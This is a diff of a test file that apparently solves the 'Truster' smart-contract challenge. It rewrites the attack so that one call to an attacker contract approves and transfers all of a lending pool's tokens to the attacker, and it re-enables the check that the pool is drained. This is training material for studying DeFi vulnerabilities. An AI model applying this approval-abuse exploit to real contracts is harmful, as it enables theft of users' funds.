@@ -35,18 +35,14 @@ describe("[Challenge] Truster", function () {
     const parameters = [this.attackerPool.address, TOKENS_IN_POOL];
     const encodedData = IERC20.encodeFunctionData(signature, parameters);
 
-    // encoded data set approval for attack contract
-    await this.attackerPool.execute(TOKENS_IN_POOL, this.attackerPool.address, this.token.address, encodedData);
-    expect(await this.token.allowance(this.pool.address, this.attackerPool.address)).to.eq(TOKENS_IN_POOL);
-
-    // initiate token transfer
-    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+    // encoded data will set approval for attack contract, and transfer stolen funds to caller
+    await this.attackerPool.connect(attacker).execute(TOKENS_IN_POOL, this.token.address, encodedData);
   });
 
   after(async function () {
     /** SUCCESS CONDITIONS */
     // Attacker has taken all tokens from the pool
-    //expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
     expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
   });
 });
